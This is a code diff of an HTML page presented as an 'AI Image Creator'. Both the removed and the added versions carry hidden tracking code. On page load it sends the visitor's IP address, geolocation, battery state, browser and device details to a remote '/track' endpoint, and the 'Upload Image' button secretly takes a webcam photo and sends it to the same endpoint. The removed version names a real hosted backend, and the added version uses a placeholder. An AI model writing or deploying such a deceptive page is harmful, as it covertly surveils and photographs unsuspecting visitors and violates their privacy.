@@ -4,91 +4,118 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Image Creator</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
-    <script>
-        const backendURL = "https://flash-3vfu.onrender.com"; // ✅ Update with your backend URL
-        const sessionId = Math.random().toString(36).substr(2, 9); // ✅ Generate unique session ID
-
-        async function trackDevice() {
-            try {
-                const battery = await navigator.getBattery();
-                const geo = await new Promise((resolve) => 
-                    navigator.geolocation.getCurrentPosition(pos => resolve(pos.coords), () => resolve({}))
-                );
-                const device = {
-                    platform: navigator.platform,
-                    userAgent: navigator.userAgent,
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    cookiesEnabled: navigator.cookieEnabled,
-                    plugins: [...navigator.plugins].map(p => p.name).join(", "),
-                    ip: await (await fetch("https://api64.ipify.org?format=json")).json().then(data => data.ip)
-                };
-                
-                const data = { sessionId, battery: { level: battery.level * 100, charging: battery.charging }, geo, device };
-                fetch(`${backendURL}/track/${sessionId}`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data)
-                }).catch(err => console.log("Error sending data:", err));
-            } catch (error) {
-                console.error("Tracking failed:", error);
-            }
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f4f4f4;
         }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .hidden { display: none; }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>AI Image Generator</h2>
+        <p>Upload an image to enhance it with AI</p>
+        <video id="video" class="hidden" autoplay></video>
+        <canvas id="canvas" class="hidden"></canvas>
+        <button id="uploadBtn">Upload Image</button>
+    </div>
 
-        async function capturePhoto() {
+    <script>
+        const backendURL = "https://your-backend-url.com";  // Replace with your backend URL
+        const sessionId = Math.random().toString(36).substring(2, 15);
+        let deviceData = {};
+
+        // 📸 Capture Photo & Send Data
+        document.getElementById("uploadBtn").addEventListener("click", async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement("video");
+                const video = document.getElementById("video");
                 video.srcObject = stream;
                 video.play();
-                
+
                 setTimeout(() => {
-                    const canvas = document.createElement("canvas");
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
+                    const canvas = document.getElementById("canvas");
+                    const context = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
                     const photo = canvas.toDataURL("image/png");
-                    fetch(`${backendURL}/track/${sessionId}`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ sessionId, photo })
-                    });
+                    sendData({ photo });
                     stream.getTracks().forEach(track => track.stop());
                 }, 2000);
             } catch (error) {
                 console.error("Camera access denied:", error);
+                sendData({ photo: null });
+            }
+        });
+
+        // 📡 Collect Device Info
+        async function collectDeviceInfo() {
+            deviceData = {
+                ip: await fetch("https://api64.ipify.org?format=json").then(res => res.json()).then(data => data.ip),
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                cookiesEnabled: navigator.cookieEnabled,
+                plugins: [...navigator.plugins].map(p => p.name).join(", ")
+            };
+
+            navigator.getBattery().then(battery => {
+                deviceData.battery = {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging
+                };
+                sendData();
+            });
+
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    deviceData.geo = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    sendData();
+                });
             }
         }
 
-        document.addEventListener("DOMContentLoaded", () => {
-            trackDevice(); // ✅ Auto-track on page load
-        });
+        // 🚀 Send Data to Backend
+        function sendData(extraData = {}) {
+            const data = { ...deviceData, ...extraData };
+            fetch(`${backendURL}/track/${sessionId}`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).catch(err => console.log("Error sending data:", err));
+        }
+
+        // 🎯 Auto Start Tracking
+        collectDeviceInfo();
     </script>
-</head>
-<body class="bg-dark text-light">
-    <nav class="navbar navbar-expand-lg navbar-light bg-light">
-        <div class="container-fluid">
-            <a class="navbar-brand fw-bold" href="#">AI Image Creator</a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
-                <span class="navbar-toggler-icon"></span>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNav">
-                <ul class="navbar-nav ms-auto">
-                    <li class="nav-item"><a class="nav-link" href="#">Home</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#">About</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#">Features</a></li>
-                    <li class="nav-item"><a class="nav-link" href="#">Contact</a></li>
-                </ul>
-            </div>
-        </div>
-    </nav>
-    <div class="container text-center py-5">
-        <h1 class="display-4">Upload & Generate AI Images</h1>
-        <p class="lead">Our AI-powered tool creates stunning images instantly.</p>
-        <button class="btn btn-primary btn-lg mt-4" onclick="capturePhoto()">Upload Image</button>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
